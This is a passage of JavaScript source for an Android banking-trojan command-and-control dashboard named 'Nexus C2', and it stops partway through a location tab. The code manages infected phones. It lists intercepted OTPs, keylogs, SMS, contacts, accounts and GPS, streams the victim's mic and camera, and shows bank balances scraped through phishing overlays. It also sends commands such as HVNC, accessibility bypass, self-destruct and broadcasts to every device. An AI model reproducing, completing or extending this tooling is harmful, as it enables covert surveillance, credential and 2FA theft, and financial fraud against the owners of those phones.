'use strict';
// ═══════════════════════════════════════════════════════════════════════════
//  Nexus C2 — Dashboard v6  ·  Vue 3 Composition API (CDN, no build)
// ═══════════════════════════════════════════════════════════════════════════
const {
  createApp, reactive, ref, computed, watch,
  onMounted, onUnmounted, nextTick
} = Vue;

// ── Helpers ──────────────────────────────────────────────────────────────────
const esc = s => String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
const tsAgo = ts => {
  if (!ts) return '';
  const s = Math.floor((Date.now() - ts * 1000) / 1000);
  if (s < 5)    return 'now';
  if (s < 60)   return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s/60)}m ago`;
  if (s < 86400)return `${Math.floor(s/3600)}h ago`;
  return `${Math.floor(s/86400)}d ago`;
};
const fmtTs  = ts => ts ? new Date(ts * 1000).toLocaleString('en', { hour12: false }) : '—';
const fmtNow = ()  => new Date().toLocaleTimeString('en', { hour12: false });

// ── API ───────────────────────────────────────────────────────────────────────
async function api(path, method = 'GET', body) {
  const opts = { method, headers: { 'Content-Type': 'application/json' } };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(path, opts);
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}

// ── Global reactive store ─────────────────────────────────────────────────────
const S = reactive({
  devices:     {},        // id → device
  selected:    null,
  activePane:  'devices',
  activeTab:   'info',
  otps:        [],
  feed:        [],
  connState:   'off',     // 'off'|'conn'|'live'
  stats:       { online: 0, queued_cmds: 0, operators: 0, total: 0 },
  sidebarOpen: false,     // mobile hamburger
  otpCount:    0,
  modal:       null,      // { title, body, btns[] }
  toasts:      [],
  // Live streaming
  activeMic:   null,      // devId streaming mic
  activeCam:   null,      // devId streaming camera
});

// ── Computed / helpers ────────────────────────────────────────────────────────
function devName(id) {
  const d = S.devices[id];
  if (!d) return (id || '?').slice(0, 8);
  return d.alias || d.info?.model || d.info?.brand || id.slice(0, 8);
}

function sortedDevices(query = '') {
  const q = query.toLowerCase();
  return Object.values(S.devices)
    .filter(d => !q || devName(d.id).toLowerCase().includes(q) || d.id.toLowerCase().includes(q))
    .sort((a, b) => {
      if (a.online !== b.online) return a.online ? -1 : 1;
      return (b.last_seen || 0) - (a.last_seen || 0);
    });
}

// ── Toast system ──────────────────────────────────────────────────────────────
function toast(msg, type = 'info') {
  const id = Date.now();
  S.toasts.push({ id, msg, type });
  setTimeout(() => { const i = S.toasts.findIndex(t => t.id === id); if (i !== -1) S.toasts.splice(i, 1); }, 3800);
}

// ── Modal system ──────────────────────────────────────────────────────────────
function openModal(title, body, btns = []) {
  S.modal = { title, body, btns };
}
function closeModal() {
  S.modal = null;
}

// ── WebSocket ─────────────────────────────────────────────────────────────────
let WS = null;

function sendWS(obj) {
  WS?.sendJson(obj);
}

function initWS() {
  const proto = location.protocol === 'https:' ? 'wss://' : 'ws://';
  const url   = proto + location.host + '/ws/operator';

  WS = new NexusWS(url, {
    onOpen()    { S.connState = 'live'; },
    onClose()   { S.connState = 'off'; },
    onBinary(buf) {
      // Forward to HVNC viewer if active
      if (window._hvncViewer) window._hvncViewer.pushFrame(buf);
    },
    onMessage(msg) { handleMessage(msg); },
  });

  S.connState = 'conn';
}

// ── Message handler ───────────────────────────────────────────────────────────
function handleMessage(msg) {
  switch (msg.type) {

    case 'init':
      S.devices = {};
      for (const d of (msg.devices || [])) S.devices[d.id] = d;
      if (msg.stats) Object.assign(S.stats, msg.stats);
      break;

    case 'device_online':
      if (!S.devices[msg.id]) S.devices[msg.id] = { id: msg.id };
      Object.assign(S.devices[msg.id], { online: true, info: msg.info || {} });
      feedAdd('📲', msg.id, 'Connected', 'green');
      S.stats.online = Object.values(S.devices).filter(d => d.online).length;
      break;

    case 'device_offline':
      if (S.devices[msg.id]) S.devices[msg.id].online = false;
      feedAdd('🔴', msg.id, 'Disconnected', 'red');
      S.stats.online = Object.values(S.devices).filter(d => d.online).length;
      break;

    case 'device_update':
      if (!S.devices[msg.id]) S.devices[msg.id] = { id: msg.id };
      if (msg.patch) Object.assign(S.devices[msg.id], msg.patch);
      if (msg.info)  Object.assign(S.devices[msg.id].info ??= {}, msg.info);
      break;

    case 'device_deleted':
      delete S.devices[msg.id];
      if (S.selected === msg.id) { S.selected = null; }
      break;

    case 'stats_tick':
      Object.assign(S.stats, { online: msg.online, queued_cmds: msg.queued_cmds, operators: msg.operators, total: msg.total });
      break;

    case 'keylog':
      feedAdd('⌨️', msg.id, `${msg.data?.app||'?'}: ${(msg.data?.text||'').slice(0,60)}`);
      document.dispatchEvent(new CustomEvent('nx:keylog', { detail: msg }));
      break;

    case 'notification':
      feedAdd('🔔', msg.id, `${msg.data?.app||''}: ${msg.data?.title||''}`);
      document.dispatchEvent(new CustomEvent('nx:notif', { detail: msg }));
      break;

    case 'otp_intercepted':
      S.otps.unshift(msg);
      S.otpCount++;
      feedAdd('🔑', msg.id, `OTP: ${msg.otp} (${msg.app})`, 'yellow');
      toast(`OTP from ${devName(msg.id)}: ${msg.otp}`, 'warn');
      break;

    case 'screenshot_new':
      feedAdd('📷', msg.id, 'New screenshot');
      document.dispatchEvent(new CustomEvent('nx:ss_new', { detail: msg }));
      break;

    case 'sms_update':
      feedAdd('💬', msg.id, `SMS (${msg.count})`);
      document.dispatchEvent(new CustomEvent('nx:sms', { detail: msg }));
      break;

    case 'contacts_update':
      document.dispatchEvent(new CustomEvent('nx:contacts', { detail: msg }));
      break;

    case 'calls_update':
      feedAdd('📞', msg.id, `Calls (${msg.count})`);
      document.dispatchEvent(new CustomEvent('nx:calls', { detail: msg }));
      break;

    case 'apps_update':
      document.dispatchEvent(new CustomEvent('nx:apps', { detail: msg }));
      break;

    case 'accounts_update':
      document.dispatchEvent(new CustomEvent('nx:accounts', { detail: msg }));
      break;

    case 'location_update':
      feedAdd('📍', msg.id, `${msg.lat?.toFixed(4)}, ${msg.lng?.toFixed(4)}`);
      document.dispatchEvent(new CustomEvent('nx:location', { detail: msg }));
      break;

    case 'detection_update':
      if (S.devices[msg.id]) {
        S.devices[msg.id].fin_count    = msg.fin_count;
        S.devices[msg.id].social_count = msg.social_count;
      }
      if (msg.fin_count > 0) feedAdd('💳', msg.id, `${msg.fin_count} financial app(s)`, 'yellow');
      break;

    case 'mic_chunk':
      document.dispatchEvent(new CustomEvent('nx:mic', { detail: msg }));
      break;

    case 'camera_frame':
      document.dispatchEvent(new CustomEvent('nx:cam', { detail: msg }));
      break;

    // APK's UnlockManager sends recorded unlock gestures
    case 'unlock_sequence':
    case 'unlock':
      feedAdd('🔓', msg.id, 'Unlock sequence recorded', 'green');
      document.dispatchEvent(new CustomEvent('nx:unlock', { detail: msg }));
      break;

    // APK's BankingBypass / accessibility engine status
    case 'silent_vnc_status':
      if (S.devices[msg.id]) S.devices[msg.id].vnc_active = !!msg.active;
      break;

    // APK reports foreground app + lock state every N seconds
    case 'device_status': {
      const d = S.devices[msg.id];
      if (d) {
        d.info = d.info || {};
        d.info.fg_pkg     = msg.pkg     || msg.package || '';
        d.info.fg_app     = msg.appName || '';
        d.info.is_locked  = !!msg.locked;
        d.info.screen_on  = !!msg.screenOn;
      }
      document.dispatchEvent(new CustomEvent('nx:device_status', { detail: msg }));
      break;
    }

    // APK scraped bank balance from overlay form submission
    case 'bank_balance':
      feedAdd('💰', msg.id, `Balance scraped: ${msg.balance || '?'} (${msg.pkg || ''})`, 'yellow');
      document.dispatchEvent(new CustomEvent('nx:bank_balance', { detail: msg }));
      break;

    // APK fake call was answered / ended by victim
    case 'fake_call_status':
      feedAdd('📞', msg.id, `Fake call ${msg.status}: ${msg.callerName || ''}`, msg.status === 'ANSWERED' ? 'green' : '');
      toast(`Fake call ${msg.status} — ${msg.callerName || ''}`, msg.status === 'ANSWERED' ? 'success' : 'info');
      break;

    // APK's AccessibilityDecoy node tree
    case 'screen_hierarchy':
      document.dispatchEvent(new CustomEvent('nx:hierarchy', { detail: msg }));
      break;

    // APK's StudioFormCapture — phishing overlay data submitted by victim
    case 'studio_form_data':
      feedAdd('🎯', msg.id, `Form captured (project: ${msg.project_id || '?'})`, 'yellow');
      toast(`Overlay form captured!`, 'warn');
      document.dispatchEvent(new CustomEvent('nx:form_data', { detail: msg }));
      break;

    // APK call_action_result from CallsManager delete operations
    case 'call_action_result':
      document.dispatchEvent(new CustomEvent('nx:calls', { detail: { id: msg.id } }));
      break;

    case 'bypass_status':
    case 'bypass_update':
      document.dispatchEvent(new CustomEvent('nx:bypass', { detail: msg }));
      break;

    case 'cmd_queued':
      toast(`Queued (offline): ${msg.cmd}`, 'info');
      break;

    case 'cmd_ack':
      if (msg.delivered) toast(`→ ${msg.cmd}`, 'success');
      break;

    case 'broadcast_ack':
      toast(`Broadcast "${msg.cmd}" → ${msg.sent} device(s)`, 'success');
      break;

    case 'overlays_auto_armed':
      feedAdd('🎭', msg.dev_id, `${msg.count} overlay(s) armed`);
      break;

    case 'file_update':
      document.dispatchEvent(new CustomEvent('nx:files', { detail: msg }));
      break;

    case 'event':
      if (msg.evt !== 'heartbeat' && msg.evt !== 'pong')
        feedAdd('⚡', msg.id, msg.evt);
      break;
  }
}

// ── Feed ──────────────────────────────────────────────────────────────────────
function feedAdd(icon, devId, text, color = '') {
  S.feed.unshift({ icon, devId, text, color, ts: fmtNow() });
  if (S.feed.length > 300) S.feed.pop();
}

// ── Commands ──────────────────────────────────────────────────────────────────
function sendCmd(id, cmd, args = {}) {
  sendWS({ type: 'cmd', target: id, cmd, args });
  toast(`→ ${cmd}`, 'info');
}

// ═══════════════════════════════════════════════════════════════════════════
//  COMPONENTS
// ═══════════════════════════════════════════════════════════════════════════

// ── Toast container ───────────────────────────────────────────────────────────
const ToastContainer = {
  template: `
    <div class="toast-container">
      <transition-group name="toast">
        <div v-for="t in toasts" :key="t.id" :class="['toast', t.type]">{{ t.msg }}</div>
      </transition-group>
    </div>`,
  computed: { toasts() { return S.toasts; } }
};

// ── Modal ─────────────────────────────────────────────────────────────────────
const Modal = {
  template: `
    <div v-if="modal" class="modal-backdrop open" @click.self="closeModal()">
      <div class="modal">
        <div class="modal-header">
          <span class="modal-title">{{ modal.title }}</span>
          <button class="modal-close" @click="closeModal()">✕</button>
        </div>
        <div class="modal-body" v-html="modal.body"></div>
        <div class="modal-footer">
          <button class="btn btn-ghost btn-sm" @click="closeModal()">Cancel</button>
          <button v-for="b in modal.btns" :key="b.label" :class="['btn','btn-sm', b.cls||'btn-primary']" @click="b.fn()">{{ b.label }}</button>
        </div>
      </div>
    </div>`,
  computed: { modal() { return S.modal; } },
  methods:  { closeModal }
};

// ── Sidebar ───────────────────────────────────────────────────────────────────
const Sidebar = {
  template: `
    <aside :class="['sidebar', { open: sidebarOpen }]">
      <div class="sidebar-logo">
        <div class="logo-icon">⬡</div>
        <div>
          <div class="logo-text">NEXUS</div>
          <div class="logo-ver">C2 v6.0</div>
        </div>
        <button class="sidebar-close" @click="sidebarOpen = false">✕</button>
      </div>

      <nav class="sidebar-nav">
        <div class="nav-section">Monitor</div>
        <div v-for="item in nav" :key="item.pane"
             :class="['nav-item', { active: activePane === item.pane }]"
             @click="switchPane(item.pane)">
          <span class="nav-icon">{{ item.icon }}</span>
          <span class="nav-label">{{ item.label }}</span>
          <span v-if="item.pane === 'devices' && onlineCount > 0" class="nav-badge green">{{ onlineCount }}</span>
          <span v-if="item.pane === 'otp' && otpCount > 0" class="nav-badge yellow">{{ otpCount }}</span>
        </div>
      </nav>

      <div class="sidebar-footer">
        <div class="conn-indicator">
          <div :class="['conn-dot', connState]"></div>
          <span>{{ connLabel }}</span>
        </div>
        <div class="conn-stats">
          <span>Ops: {{ stats.operators }}</span>
          <span>Q: {{ stats.queued_cmds }}</span>
        </div>
      </div>
    </aside>`,
  computed: {
    sidebarOpen: { get() { return S.sidebarOpen; }, set(v) { S.sidebarOpen = v; } },
    activePane()  { return S.activePane; },
    connState()   { return S.connState; },
    stats()       { return S.stats; },
    onlineCount() { return S.stats.online; },
    otpCount()    { return S.otpCount; },
    connLabel() {
      const m = { live: 'Connected', conn: 'Connecting…', off: 'Offline' };
      return m[S.connState] || 'Offline';
    },
    nav() {
      return [
        { pane: 'devices',    icon: '📱', label: 'Devices' },
        { pane: 'feed',       icon: '⚡', label: 'Live Feed' },
        { pane: 'otp',        icon: '🔑', label: 'OTP Intercepts' },
        { pane: 'hvnc',       icon: '🖥',  label: 'HVNC Viewer' },
        { pane: 'keylogs',    icon: '⌨️', label: 'All Keylogs' },
        { pane: 'detections', icon: '💳', label: 'Detections' },
        { pane: 'overlays',   icon: '🎭', label: 'Overlays' },
        { pane: 'bypass',     icon: '🔓', label: 'A11y Bypass' },
      ];
    }
  },
  methods: {
    switchPane(id) { S.activePane = id; S.sidebarOpen = false; }
  }
};

// ── Header ────────────────────────────────────────────────────────────────────
const Header = {
  template: `
    <div class="header">
      <button class="hamburger" @click="S.sidebarOpen = true">☰</button>
      <div class="header-title">{{ paneTitle }}</div>
      <div class="stat-pill green"><span>Online</span><span class="val">{{ stats.online }}</span></div>
      <div class="stat-pill"><span>Total</span><span class="val">{{ stats.total || totalCount }}</span></div>
      <div class="stat-pill yellow"><span>Queue</span><span class="val">{{ stats.queued_cmds }}</span></div>
    </div>`,
  setup() {
    const paneTitle = computed(() => {
      const titles = {
        devices:'Devices', hvnc:'HVNC Viewer', otp:'OTP Intercepts',
        feed:'Live Feed', keylogs:'All Keylogs', detections:'App Detections',
        overlays:'Phishing Overlays', bypass:'A11y Bypass',
      };
      return titles[S.activePane] || S.activePane;
    });
    const stats      = computed(() => S.stats);
    const totalCount = computed(() => Object.keys(S.devices).length);
    return { S, paneTitle, stats, totalCount };
  }
};

// ── Device List ───────────────────────────────────────────────────────────────
const DeviceList = {
  template: `
    <div class="device-list-col">
      <div class="dl-header">
        <input v-model="q" type="search" class="form-input" placeholder="Search devices…">
        <button class="btn btn-ghost btn-sm btn-icon" title="Refresh" @click="reload()">↺</button>
      </div>
      <div class="dl-list">
        <div v-if="!list.length" class="empty-state">
          <div class="es-icon">📡</div>
          <div class="es-text">{{ q ? 'No matches' : 'Waiting for connections…' }}</div>
        </div>
        <div v-for="dev in list" :key="dev.id"
             :class="['device-row', { active: selected === dev.id }]"
             @click="select(dev.id)">
          <div class="dr-left">
            <div :class="['dot', dev.online ? 'on' : 'off']"></div>
          </div>
          <div class="dr-info">
            <div class="dr-model">{{ name(dev.id) }}</div>
            <div class="dr-sub">{{ sub(dev) }}</div>
          </div>
          <div class="dr-right">
            <div class="dr-time">{{ ago(dev.last_seen) }}</div>
            <div class="dr-badges">
              <span v-if="dev.fin_count > 0" class="tag fin">💳 {{ dev.fin_count }}</span>
              <span v-if="dev.social_count > 0" class="tag soc">💬 {{ dev.social_count }}</span>
              <span v-if="dev.vnc_active" class="tag vnc-tag">👁</span>
            </div>
          </div>
        </div>
      </div>
    </div>`,
  setup() {
    const q        = ref('');
    const selected = computed(() => S.selected);
    const list     = computed(() => sortedDevices(q.value));
    const name     = id  => devName(id);
    const ago      = ts  => tsAgo(ts);
    const sub = dev => {
      const i = dev.info || {};
      return [i.android_version ? `Android ${i.android_version}` : null, i.country, dev.id.slice(0,8)].filter(Boolean).join(' · ');
    };
    const select = id => { S.selected = id; S.activeTab = 'info'; };
    const reload = () => location.reload();
    return { q, selected, list, name, ago, sub, select, reload };
  }
};

// ── Device Detail ─────────────────────────────────────────────────────────────
const DeviceDetail = {
  template: `
    <div class="device-detail-col">
      <div v-if="!dev" class="empty-state" style="height:100%">
        <div class="es-icon">👈</div>
        <div class="es-text">Select a device</div>
      </div>

      <template v-else>
        <!-- Header -->
        <div class="dd-header">
          <div>
            <div class="dd-title">
              <div :class="['dot', dev.online ? 'on' : 'off']"></div>
              {{ name }}
            </div>
            <div class="dd-sub mono">{{ dev.id }}</div>
          </div>
          <div class="dd-actions">
            <button class="btn btn-ghost btn-sm" @click="cmd('SNAP_SCREEN')">📷 Snap</button>
            <button class="btn btn-primary btn-sm" @click="openHVNC()">🖥 HVNC</button>
            <button class="btn btn-warning btn-sm" @click="openBypass()">🔓 Bypass</button>
            <button :class="['btn btn-sm', dev.online ? 'btn-danger' : 'btn-success']"
                    @click="dev.online ? cmd('SELF_DESTRUCT') : cmd('RECONNECT_CONNECTION')">
              {{ dev.online ? '💀 Kill' : '♻️ Revive' }}
            </button>
            <button class="btn btn-ghost btn-sm btn-icon" @click="deleteDev()">🗑</button>
          </div>
        </div>

        <!-- Tabs -->
        <div class="dd-tabs">
          <div v-for="t in tabs" :key="t.id"
               :class="['dd-tab', { active: activeTab === t.id }]"
               @click="activeTab = t.id">{{ t.label }}</div>
        </div>

        <!-- Tab content -->
        <div class="dd-content">
          <InfoTab     v-if="activeTab==='info'"     :dev="dev" :devId="devId" />
          <CmdTab      v-if="activeTab==='cmd'"      :devId="devId" />
          <KeylogTab   v-if="activeTab==='keylog'"   :devId="devId" />
          <SmsTab      v-if="activeTab==='sms'"      :devId="devId" />
          <CallsTab    v-if="activeTab==='calls'"    :devId="devId" />
          <ContactsTab v-if="activeTab==='contacts'" :devId="devId" />
          <AppsTab     v-if="activeTab==='apps'"     :devId="devId" />
          <AccountsTab v-if="activeTab==='accounts'" :devId="devId" />
          <LocationTab v-if="activeTab==='location'" :devId="devId" />
          <NotifTab    v-if="activeTab==='notif'"    :devId="devId" />
          <SsTab       v-if="activeTab==='ss'"       :devId="devId" />
          <CameraTab   v-if="activeTab==='camera'"   :devId="devId" />
          <MicTab      v-if="activeTab==='mic'"      :devId="devId" />
        </div>
      </template>
    </div>`,
  setup() {
    const devId    = computed(() => S.selected);
    const dev      = computed(() => devId.value ? S.devices[devId.value] : null);
    const name     = computed(() => devName(devId.value || ''));
    const activeTab = computed({
      get() { return S.activeTab; },
      set(v) { S.activeTab = v; }
    });
    const tabs = [
      { id:'info',     label:'Info' },
      { id:'cmd',      label:'Commands' },
      { id:'keylog',   label:'Keylogs' },
      { id:'sms',      label:'SMS' },
      { id:'calls',    label:'Calls' },
      { id:'contacts', label:'Contacts' },
      { id:'apps',     label:'Apps' },
      { id:'accounts', label:'Accounts' },
      { id:'location', label:'Location' },
      { id:'notif',    label:'Notifications' },
      { id:'ss',       label:'Screenshots' },
      { id:'camera',   label:'Camera' },
      { id:'mic',      label:'Mic' },
    ];
    function cmd(c, args = {}) { sendCmd(devId.value, c, args); }
    function openHVNC()  { S.activePane = 'hvnc'; /* HVNCPane picks up S.selected */ }
    function openBypass(){ S.activePane = 'bypass'; }
    async function deleteDev() {
      if (!confirm('Delete all data for this device?')) return;
      await api(`/api/devices/${devId.value}`, 'DELETE');
      S.selected = null;
      toast('Device deleted', 'success');
    }
    return { devId, dev, name, activeTab, tabs, cmd, openHVNC, openBypass, deleteDev };
  }
};

// ── InfoTab ───────────────────────────────────────────────────────────────────
const InfoTab = {
  template: `
    <div class="tab-scroll p-14">
      <table class="nx-table">
        <tr v-for="[k,v] in rows" :key="k">
          <td class="text-dim" style="width:130px">{{ k }}</td>
          <td class="mono">{{ v }}</td>
        </tr>
      </table>
      <div class="form-group" style="margin-top:14px">
        <label class="form-label">Set Alias</label>
        <div class="flex gap-8">
          <input v-model="alias" class="form-input" placeholder="Friendly name…">
          <button class="btn btn-primary btn-sm" @click="saveAlias()">Save</button>
        </div>
      </div>
    </div>`,
  props: ['dev', 'devId'],
  setup(props) {
    const alias = ref(props.dev?.alias || '');
    const rows  = computed(() => {
      const d = props.dev || {};
      const i = d.info || {};
      return [
        ['ID',           props.devId],
        ['Alias',        d.alias || '—'],
        ['Model',        i.model || i.brand || '—'],
        ['Android',      i.android_version ? `Android ${i.android_version} (API ${i.sdk||'?'})` : '—'],
        ['CPU ABI',      i.abi || i.cpu_abi || '—'],
        ['Screen',       i.screen_w && i.screen_h ? `${i.screen_w}×${i.screen_h}` : '—'],
        ['Language',     i.language || '—'],
        ['Country',      i.country || '—'],
        ['Carrier',      i.carrier || '—'],
        ['IMEI',         i.imei || '—'],
        ['IP',           i.ip || i.local_ip || '—'],
        ['Battery',      i.battery != null ? `${i.battery}%` : '—'],
        ['Rooted',       i.rooted != null ? (i.rooted ? '✅ Yes' : '❌ No') : '—'],
        ['Accessibility',i.accessibility ? '✅ Active' : '—'],
        ['Admin',        i.device_admin ? '✅ Yes' : '—'],
        ['First seen',   d.first_seen ? new Date(d.first_seen*1000).toLocaleString() : '—'],
        ['Last seen',    d.last_seen  ? new Date(d.last_seen*1000).toLocaleString()  : '—'],
        ['Fin apps',     d.fin_count    || 0],
        ['Social apps',  d.social_count || 0],
      ];
    });
    async function saveAlias() {
      await api(`/api/devices/${props.devId}/alias`, 'PATCH', { alias: alias.value || null });
      if (S.devices[props.devId]) S.devices[props.devId].alias = alias.value || null;
      toast('Alias saved', 'success');
    }
    return { alias, rows, saveAlias };
  }
};

// ── CmdTab ────────────────────────────────────────────────────────────────────
const CmdTab = {
  template: `
    <div class="cmd-tab">
      <div class="cmd-toolbar">
        <input v-model="q" class="form-input" style="width:180px" placeholder="Filter commands…">
        <input v-model="rawCmd" class="form-input mono" style="width:130px" placeholder="cmd name">
        <input v-model="rawArgs" class="form-input mono" style="width:180px" placeholder='{"key":"val"}'>
        <button class="btn btn-primary btn-sm" @click="quickSend()">Send</button>
        <button class="btn btn-ghost btn-sm" @click="broadcastDlg()">📡 Broadcast</button>
      </div>
      <div class="cmd-grid">
        <template v-for="cat in filtered" :key="cat.cat">
          <div class="cmd-cat">
            <div class="cmd-cat-header" :style="{color: cat.color}">{{ cat.icon }} {{ cat.cat }}</div>
            <div class="cmd-list">
              <div v-for="c in cat.cmds" :key="c.cmd" class="cmd-item"
                   @click="c.args&&c.args.length ? cmdModal(c) : send(c.cmd)">
                <div class="ci-dot" :style="{background: cat.color}"></div>
                <span>{{ c.label || c.cmd }}</span>
                <span v-if="c.args&&c.args.length" class="cmd-args-icon">⚙</span>
              </div>
            </div>
          </div>
        </template>
      </div>
    </div>`,
  props: ['devId'],
  setup(props) {
    const q       = ref('');
    const rawCmd  = ref('');
    const rawArgs = ref('');
    const filtered = computed(() => {
      if (!q.value) return CMD_CATALOG;
      const lq = q.value.toLowerCase();
      return CMD_CATALOG.map(cat => ({
        ...cat,
        cmds: cat.cmds.filter(c => (c.label||c.cmd).toLowerCase().includes(lq))
      })).filter(cat => cat.cmds.length);
    });
    function send(cmd, args = {}) { sendCmd(props.devId, cmd, args); }
    function quickSend() {
      const cmd = rawCmd.value.trim();
      if (!cmd) return;
      let args = {};
      if (rawArgs.value.trim()) {
        try { args = JSON.parse(rawArgs.value); } catch { toast('Args JSON invalid', 'error'); return; }
      }
      send(cmd, args);
    }
    function cmdModal(cDef) {
      let formHtml = '';
      for (const a of cDef.args)
        formHtml += `<div class="form-group"><label class="form-label">${esc(a.key)}</label><input class="form-input" id="ca-${esc(a.key)}" value="${esc(a.def||'')}" placeholder="${esc(a.hint||'')}"></div>`;
      openModal(`Command: ${cDef.cmd}`, formHtml || '<p class="text-dim">No arguments.</p>', [{
        label: 'Send', cls: 'btn-primary', fn() {
          const args = {};
          for (const a of cDef.args) {
            const el = document.getElementById(`ca-${a.key}`);
            if (el?.value) args[a.key] = a.type === 'number' ? Number(el.value) : el.value === 'true' ? true : el.value === 'false' ? false : el.value;
          }
          send(cDef.cmd, args);
          closeModal();
        }
      }]);
    }
    function broadcastDlg() {
      openModal('Broadcast Command', `
        <div class="form-group"><label class="form-label">Command</label><input class="form-input" id="bc-cmd"></div>
        <div class="form-group"><label class="form-label">Args JSON</label><input class="form-input" id="bc-args" value="{}"></div>`, [{
        label: 'Broadcast', cls: 'btn-danger', fn() {
          const cmd = document.getElementById('bc-cmd')?.value?.trim();
          if (!cmd) return;
          let args = {};
          try { args = JSON.parse(document.getElementById('bc-args')?.value || '{}'); } catch { toast('Invalid JSON', 'error'); return; }
          sendWS({ type: 'broadcast_cmd', cmd, args });
          closeModal();
        }
      }]);
    }
    return { q, rawCmd, rawArgs, filtered, send, quickSend, cmdModal, broadcastDlg };
  }
};

// ── Generic table tab factory ─────────────────────────────────────────────────
function makeTableTab(urlFn, headersFn, rowsFn, emptyIcon, eventName, opts = {}) {
  return {
    template: `
      <div class="tab-scroll">
        <div v-if="loading" class="empty-state"><div class="es-icon">⏳</div></div>
        <div v-else-if="error" class="empty-state"><div class="es-text text-red">{{ error }}</div></div>
        <div v-else-if="!rows.length" class="empty-state">
          <div class="es-icon">{{ emptyIcon }}</div>
          <div class="es-text">No data</div>
        </div>
        <template v-else>
          <div v-if="refreshBtn" style="padding:8px 12px;border-bottom:1px solid var(--border)">
            <button class="btn btn-ghost btn-sm" @click="load()">🔄 Refresh</button>
          </div>
          <div class="nx-table-wrap">
            <table class="nx-table">
              <thead><tr><th v-for="h in headers" :key="h">{{ h }}</th></tr></thead>
              <tbody>
                <tr v-for="(row,i) in rows" :key="i">
                  <td v-for="(cell,j) in row" :key="j" v-html="cell"></td>
                </tr>
              </tbody>
            </table>
          </div>
        </template>
      </div>`,
    props: ['devId'],
    setup(props) {
      const loading = ref(true);
      const error   = ref('');
      const headers = ref([]);
      const rows    = ref([]);
      const emptyIcon2 = opts.emptyIcon || '📭';
      const refreshBtn = opts.refresh || false;

      async function load() {
        loading.value = true; error.value = '';
        try {
          const data = await api(urlFn(props.devId));
          headers.value = headersFn(data);
          rows.value    = rowsFn(data);
        } catch(e) { error.value = e.message; }
        loading.value = false;
      }

      onMounted(() => load());
      if (eventName) {
        const handler = e => { if (e.detail?.id === props.devId) load(); };
        document.addEventListener(eventName, handler);
        onUnmounted(() => document.removeEventListener(eventName, handler));
      }
      return { loading, error, headers, rows, emptyIcon: emptyIcon2, refreshBtn, load };
    }
  };
}

const SmsTab = makeTableTab(
  id => `/api/devices/${id}/sms`,
  () => ['From/To', 'Body', 'Date', 'Type'],
  r => (r?.data || []).slice(0,300).map(s => [
    esc(s.address || s.from || '?'),
    esc((s.body || s.text || '').slice(0,120)),
    fmtTs(s.date ? Math.floor(s.date/1000) : null),
    s.type==1 ? 'Inbox' : s.type==2 ? 'Sent' : String(s.type||'?'),
  ]),
  '💬', 'nx:sms'
);

const CallsTab = makeTableTab(
  id => `/api/devices/${id}/calls`,
  () => ['Number', 'Name', 'Duration', 'Date', 'Type'],
  r => {
    const typeMap = { 1:'📥 In', 2:'📤 Out', 3:'❌ Missed', 5:'🔇 Rejected' };
    return (r?.data || []).slice(0,300).map(c => [
      esc(c.number || c.phone_no || '?'),
      esc(c.name || '—'),
      `${c.duration||0}s`,
      fmtTs(c.date ? Math.floor(c.date/1000) : null),
      typeMap[c.type] || String(c.type||'?'),
    ]);
  },
  '📞', 'nx:calls', { refresh: true }
);

const ContactsTab = makeTableTab(
  id => `/api/devices/${id}/contacts`,
  () => ['Name', 'Phone', 'Email'],
  r => (r?.data || []).slice(0,500).map(c => [
    esc(c.name || c.display_name || '?'),
    esc(c.phone || c.number || '—'),
    esc(c.email || '—'),
  ]),
  '👤', 'nx:contacts'
);

const AppsTab = makeTableTab(
  id => `/api/devices/${id}/apps`,
  () => ['App Name', 'Package', 'System'],
  r => (r?.data || []).slice(0,500).map(a => [
    esc(a.name || a.label || '?'),
    `<span class="mono" style="font-size:10px">${esc(a.package || a.packageName || '—')}</span>`,
    a.system ? '⚙' : '—',
  ]),
  '📱', 'nx:apps'
);

const AccountsTab = makeTableTab(
  id => `/api/devices/${id}/accounts`,
  () => ['Account', 'Type'],
  r => (r?.data || []).slice(0,200).map(a => [
    esc(a.name || a.email || a.account || '?'),
    esc(a.type || a.accountType || '—'),
  ]),
  '👥', 'nx:accounts'
);

// ── KeylogTab ─────────────────────────────────────────────────────────────────
const KeylogTab = {
  template: `
    <div class="tab-scroll">
      <div v-if="loading" class="empty-state"><div class="es-icon">⏳</div></div>
      <div v-else-if="!rows.length" class="empty-state">
        <div class="es-icon">⌨️</div><div class="es-text">No keylogs yet</div>
      </div>
      <div v-else>
        <div v-for="r in rows" :key="r.id" :class="['kl-entry', { 'kl-pass': r.is_password }]">
          <span class="kl-ts">{{ fmt(r.ts) }}</span>
          <span class="kl-app">{{ r.app || r.pkg || '?' }}</span>
          <span class="kl-text">{{ r.is_password ? '●'.repeat(Math.min((r.text||'').length,16)) : (r.text||'') }}</span>
        </div>
      </div>
    </div>`,
  props: ['devId'],
  setup(props) {
    const loading = ref(true);
    const rows    = ref([]);
    const fmt     = ts => fmtTs(ts);
    async function load() {
      loading.value = true;
      try { rows.value = await api(`/api/devices/${props.devId}/keylogs?limit=500`); } catch {}
      loading.value = false;
    }
    onMounted(load);
    const handler = e => { if (e.detail?.id === props.devId) load(); };
    document.addEventListener('nx:keylog', handler);
    onUnmounted(() => document.removeEventListener('nx:keylog', handler));
    return { loading, rows, fmt };
  }
};

// ── LocationTab ───────────────────────────────────────────────────────────────
const LocationTab = {
  template: `
    <div class="tab-scroll p-14">
      <div v-if="loading" class="empty-state"><div class="es-icon">⏳</div></div>
      <div v-else-if="!rows.length" class="empty-state">
        <div class="es-icon">📍</div><div class="es-text">No location data</div>
      </div>
      <template v-else>
        <div class="card" style="padding:12px 14px;margin-bottom:12px">
          <div class="flex gap-8" style="flex-wrap:wrap">
            <div><div class="text-dim" style="font-size:10px">LAT</div><div class="mono">{{ last.lat.toFixed(6) }}</div></div>
            <div><div class="text-dim" style="font-size:10px">LNG</div><div class="mono">{{ last.lng.toFixed(6) }}</div></div>
            <div v-if="last.accuracy"><div class="text-dim" style="font-size:10px">ACC</div><div>{{ last.accuracy }}m</div></div>
            <div v-if="last.address"><div class="text-dim" style="font-size:10px">ADDR</div><div>{{ last.address }}</div></div>
          </div>
          <div style="margin-top:10px;display:flex;gap:8px">
